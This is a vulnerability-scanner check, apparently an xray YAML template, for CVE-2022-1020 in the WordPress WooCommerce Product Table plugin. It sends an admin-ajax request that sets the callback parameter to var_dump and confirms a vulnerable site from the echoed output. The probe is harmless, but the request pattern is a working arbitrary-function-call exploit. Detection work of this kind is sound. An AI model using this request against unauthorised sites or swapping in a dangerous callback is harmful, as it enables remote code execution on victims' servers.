name: poc-yaml-wordpress-woo-product-table-cve-2022-1020-rce
binding: cf22716c-7e7c-419c-8757-7f28916ecb51
manual: true
detail:
    author: socat
    links:
        - https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5
    vulnerability:
        id: CT-422167
        level: critical
transport: http
set:
    r1: randomInt(400000, 410000)
    r2: randomInt(300000, 310000)
    r3: string(r1) + " " + string(r2)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=wpt_admin_update_notice_option&option_key=a&option_value={{r1}}+{{r2}}&perpose=update&callback=var_dump
            follow_redirects: false
        expression: |
            response.status == 200 && response.body.bcontains(bytes(r3)) && response.body.bstartsWith(b"string(13) \"")
expression: r0()
